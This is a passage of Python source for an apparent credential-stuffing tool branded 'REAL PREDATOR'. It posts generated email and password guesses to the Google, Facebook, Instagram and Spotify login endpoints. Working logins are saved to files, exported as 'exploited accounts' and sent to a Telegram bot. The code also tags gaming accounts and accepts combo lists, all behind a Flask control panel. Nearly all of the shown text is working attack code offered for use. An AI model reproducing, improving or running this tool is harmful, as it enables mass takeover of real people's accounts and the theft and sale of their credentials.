        if any(x in login_text for x in ['recover', 'verify your identity', 'two-step', 'security challenge']):
            return None, 'twofa'
        return None, 'bad'
    except:
        return None, 'error'

def check_google_real(email, password, session):
    try:
        url = "https://accounts.google.com/ServiceLogin"
        resp = session.get(url, timeout=15)
        text = resp.text
        galx_match = re.search(r'name="GALX"[^>]*value="([^"]+)"', text, re.I)
        if not galx_match:
            return None, 'bad'
        galx = galx_match.group(1)
        data = {'Email': email, 'Passwd': password, 'GALX': galx, 'signIn': 'Sign in', 'PersistentCookie': 'yes'}
        login_resp = session.post('https://accounts.google.com/ServiceLoginAuth', data=data, allow_redirects=True, timeout=15)
        if 'https://mail.google.com' in login_resp.url or 'https://accounts.google.com' not in login_resp.url:
            return {'success': True, 'taken': True, 'platform': 'Google'}, 'hit'
        if 'incorrect' in login_resp.text.lower() or 'wrong' in login_resp.text.lower():
            return None, 'bad'
        if '2fa' in login_resp.text.lower() or 'two-step' in login_resp.text.lower():
            return None, 'twofa'
        return None, 'bad'
    except:
        return None, 'error'

def check_facebook_real(email, password, session):
    try:
        url = "https://www.facebook.com/login.php"
        resp = session.get(url, timeout=15)
        text = resp.text
        lsd_match = re.search(r'name="lsd"[^>]*value="([^"]+)"', text, re.I)
        jazoest_match = re.search(r'name="jazoest"[^>]*value="([^"]+)"', text, re.I)
        if not lsd_match:
            return None, 'bad'
        data = {'email': email, 'pass': password, 'lsd': lsd_match.group(1), 'jazoest': jazoest_match.group(1) if jazoest_match else '', 'login': 'Log In'}
        login_resp = session.post('https://www.facebook.com/login/', data=data, allow_redirects=True, timeout=15)
        if 'home.php' in login_resp.url or 'https://www.facebook.com/' == login_resp.url[:len('https://www.facebook.com/')]:
            return {'success': True, 'taken': True, 'platform': 'Facebook'}, 'hit'
        if 'incorrect' in login_resp.text.lower() or 'wrong' in login_resp.text.lower():
            return None, 'bad'
        if '2fa' in login_resp.text.lower() or 'two-factor' in login_resp.text.lower():
            return None, 'twofa'
        return None, 'bad'
    except:
        return None, 'error'

def check_instagram_real(email, password, session):
    try:
        url = "https://www.instagram.com/accounts/login/"
        resp = session.get(url, timeout=15)
        text = resp.text
        csrf_match = re.search(r'"csrf_token":"([^"]+)"', text, re.I)
        if not csrf_match:
            return None, 'bad'
        csrf = csrf_match.group(1)
        headers = {'X-CSRFToken': csrf, 'X-Requested-With': 'XMLHttpRequest'}
        data = {'username': email, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1735689600:{password}'}
        login_resp = session.post('https://www.instagram.com/accounts/login/ajax/', data=data, headers=headers, timeout=15)
        if '"authenticated":true' in login_resp.text:
            return {'success': True, 'taken': True, 'platform': 'Instagram'}, 'hit'
        if 'incorrect' in login_resp.text.lower() or 'wrong' in login_resp.text.lower():
            return None, 'bad'
        if 'two_factor' in login_resp.text.lower():
            return None, 'twofa'
        return None, 'bad'
    except:
        return None, 'error'

def check_spotify_real(email, password, session):
    try:
        url = "https://accounts.spotify.com/en/login"
        resp = session.get(url, timeout=15)
        text = resp.text
        csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', text, re.I)
        if not csrf_match:
            return None, 'bad'
        csrf = csrf_match.group(1)
        data = {'username': email, 'password': password, 'csrf_token': csrf}
        login_resp = session.post('https://accounts.spotify.com/api/login', data=data, timeout=15)
        if 'login_success' in login_resp.text or 'accessToken' in login_resp.text:
            return {'success': True, 'taken': True, 'platform': 'Spotify'}, 'hit'
        if 'incorrect' in login_resp.text.lower() or 'wrong' in login_resp.text.lower():
            return None, 'bad'
        return None, 'bad'
    except:
        return None, 'error'

# ================================================================
# الحلقة الرئيسية
# ================================================================

def predator_loop():
    while state.running:
        try:
            speed = state.speed
            delay = 60 / speed if speed > 0 else 0.4
            email, password, phone, platform, icon, color, domain, is_gaming = generate_weak_account()
            result, status = real_check_platform(email, password, platform, domain)
            
            with state.lock:
                state.checked += 1
                state.total = state.checked + 1

            if result and result.get('success'):
                with state.lock:
                    state.hits += 1
                    state.real_hits += 1
                    if result.get('taken'):
                        state.premium += 1
                
                account_status = 'taken' if result.get('taken') else 'available'
                status_text = '🔴 TAKEN' if result.get('taken') else '🟢 HIT'
                
                with state.lock:
                    state.generated += 1
                    num = state.generated

                weak_reason = "كلمة سر ضعيفة"
                if password.lower() == email.lower():
                    weak_reason = "كلمة سر = الإيميل 🔥"
                elif password.lower() == email.split('@')[0].lower():
                    weak_reason = "كلمة سر = اسم المستخدم 🔥"
                elif password.lower() in COMMON_PASSWORDS:
                    weak_reason = f"كلمة سر مشهورة: {password.lower()}"
                elif password.isdigit():
                    weak_reason = "كلمة سر = رقم"
                elif any(x in password for x in ['123', '2024', '!', '@', '#']):
                    weak_reason = "تركيبة ضعيفة جداً"

                # تحديد إذا كان الحساب مرتبط بألعاب
                is_gaming_account = is_gaming or platform in GAMING_PLATFORMS
                gaming_tag = " 🎮 GAMING" if is_gaming_account else ""

                hit_content = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 Account #{num}{gaming_tag}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 Email: {email}
🔑 Password: {password}
📱 Phone: {phone}
🌐 Platform: {platform}
🎯 Weakness: {weak_reason}
📊 Status: {status_text}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

                # تخزين مع معلومات إضافية
                result_entry = {
                    'content': hit_content,
                    'is_gaming': is_gaming_account,
                    'platform': platform,
                    'email': email,
                    'password': password,
                    'status': status_text
                }
                
                state.results.insert(0, result_entry)
                if len(state.results) > 500:
                    state.results = state.results[:500]

                if is_gaming_account:
                    with state.lock:
                        state.gaming = getattr(state, 'gaming', 0) + 1

                feed_type = 'gaming' if is_gaming_account else ('hit' if not result.get('taken') else 'taken')
                feed_text = f"{status_text} | {platform} | {email}"
                add_feed(feed_type, feed_text)
                save_hit(hit_content, is_gaming_account)

                if state.telegram_enabled and state.bot_token and state.chat_id:
                    telegram_msg = f"""🔥 REAL PREDATOR HIT!

{hit_content}

👨‍💻 Developer: {DEVELOPER}
📱 Telegram: {DEV_TELEGRAM}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                    send_telegram(telegram_msg)

            elif status == 'bad':
                with state.lock:
                    state.bad += 1
            elif status == 'twofa':
                with state.lock:
                    state.twofa += 1
            else:
                with state.lock:
                    state.errors += 1

            time.sleep(delay)

        except Exception as e:
            with state.lock:
                state.errors += 1
            time.sleep(0.5)

def add_feed(feed_type, text):
    with state.feed_lock:
        state.feed.insert(0, {'type': feed_type, 'text': text, 'time': datetime.now().strftime('%H:%M:%S')})
        if len(state.feed) > 150:
            state.feed = state.feed[:150]

def save_hit(content, is_gaming=False):
    try:
        os.makedirs('REAL_PREDATOR_HITS', exist_ok=True)
        filename = f'REAL_PREDATOR_HITS/hits_{datetime.now().strftime("%Y%m%d")}.txt'
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(content + '\n\n')
        
        if is_gaming:
            gaming_filename = f'REAL_PREDATOR_HITS/gaming_accounts_{datetime.now().strftime("%Y%m%d")}.txt'
            with open(gaming_filename, 'a', encoding='utf-8') as f:
                f.write(content + '\n\n')
    except:
        pass

def send_telegram(content):
    try:
        if not state.bot_token or not state.chat_id:
            return
        url = f"https://api.telegram.org/bot{state.bot_token}/sendMessage"
        data = {"chat_id": state.chat_id, "text": content}
        requests.post(url, data=data, timeout=10)
    except:
        pass

# ================================================================
# Routes
# ================================================================

@app.route('/')
def index():
    return render_template_string(
        HTML_TEMPLATE,
        developer=DEVELOPER,
        dev_telegram=DEV_TELEGRAM,
        whatsapp_link=WHATSAPP_LINK,
        platforms=PLATFORMS,
        bot_token=state.bot_token,
        chat_id=state.chat_id,
        telegram_enabled=state.telegram_enabled
    )

@app.route('/api/stats')
def get_stats():
    elapsed = 0
    if state.start_time:
        elapsed = time.time() - state.start_time
    cpm = int((state.checked / elapsed) * 60) if elapsed > 2 else 0
    gaming_count = getattr(state, 'gaming', 0)
    return jsonify({
        'success': True,
        'running': state.running,
        'checked': state.checked,
        'total': state.total,
        'hits': state.hits,
        'bad': state.bad,
        'twofa': state.twofa,
        'errors': state.errors,
        'premium': state.premium,
        'real': state.real_hits,
        'taken': state.premium,
        'available': state.hits - state.premium,
        'elapsed': int(elapsed),
        'cpm': cpm,
        'gaming': gaming_count
    })

@app.route('/api/feed')
def get_feed():
    return jsonify({'success': True, 'feed': state.feed[:100]})

@app.route('/api/results')
def get_results():
    # تحويل النتائج إلى JSON مع معلومات إضافية
    results_json = []
    for item in state.results[:200]:
        if isinstance(item, dict):
            results_json.append(item)
        else:
            results_json.append({'content': item, 'is_gaming': False})
    return jsonify({'success': True, 'results': results_json})

@app.route('/api/start', methods=['POST'])
def start_predator():
    if state.running:
        return jsonify({'success': False, 'error': 'Already running'})
    data = request.json or {}
    speed = int(data.get('speed', 150))
    state.speed = min(max(speed, 5), 300)
    with state.lock:
        state.running = True
        state.start_time = time.time()
        state.checked = 0
        state.total = 0
        state.hits = 0
        state.bad = 0
        state.twofa = 0
        state.errors = 0
        state.premium = 0
        state.real_hits = 0
        state.generated = 0
        state.gaming = 0
        state.feed = []
        state.results = []
    add_feed('info', f'🔥 PREDATOR STARTED | {state.speed} RPM | {len(PLATFORMS)} Platforms')
    add_feed('info', '🎯 Hunting for gaming accounts too!')
    thread = threading.Thread(target=predator_loop, daemon=True)
    thread.start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_predator():
    state.running = False
    add_feed('info', '🛑 PREDATOR STOPPED')
    return jsonify({'success': True})

@app.route('/api/clear', methods=['POST'])
def clear_data():
    with state.lock:
        state.results = []
        state.feed = []
        state.checked = 0
        state.hits = 0
        state.bad = 0
        state.twofa = 0
        state.errors = 0
        state.premium = 0
        state.real_hits = 0
        state.gaming = 0
    return jsonify({'success': True})

@app.route('/api/export', methods=['POST'])
def export_results():
    if not state.results:
        return jsonify({'success': False, 'error': 'No results'})
    filename = f"real_predator_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"REAL PREDATOR - EXPLOITED ACCOUNTS\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Developer: {DEVELOPER}\n")
        f.write(f"Telegram: {DEV_TELEGRAM}\n")
        f.write("="*60 + "\n\n")
        f.write(f"Total: {len(state.results)}\n")
        f.write(f"Gaming Accounts: {getattr(state, 'gaming', 0)}\n")
        f.write("="*60 + "\n\n")
        for item in state.results:
            if isinstance(item, dict):
                f.write(item['content'] + '\n\n')
            else:
                f.write(item + '\n\n')
    return jsonify({'success': True, 'filename': filename, 'count': len(state.results)})

@app.route('/api/download/<filename>')
def download_file(filename):
    if os.path.exists(filename):
        return send_file(filename, as_attachment=True)
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    data = request.json
    content = data.get('content', '')
    lines = [l.strip() for l in content.split('\n') if ':' in l.strip()]
    state.total = len(lines)
    return jsonify({'success': True, 'count': len(lines)})

@app.route('/api/telegram/config', methods=['POST'])
def telegram_config():
    data = request.json
    state.bot_token = data.get('bot_token', '').strip()
    state.chat_id = data.get('chat_id', '').strip()
    state.telegram_enabled = data.get('enabled', False)
    add_feed('info', f'📡 Telegram: {"ON" if state.telegram_enabled else "OFF"}')
    return jsonify({'success': True})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("""
╔══════════════════════════════════════════════════════════════╗
║   REAL PREDATOR v14.5                                      ║
║   Developer: ZERO STORE                                    ║
║   Telegram: @MRDPY                                          ║
║   20 Platforms | Gaming Account Detection                  ║
╚══════════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
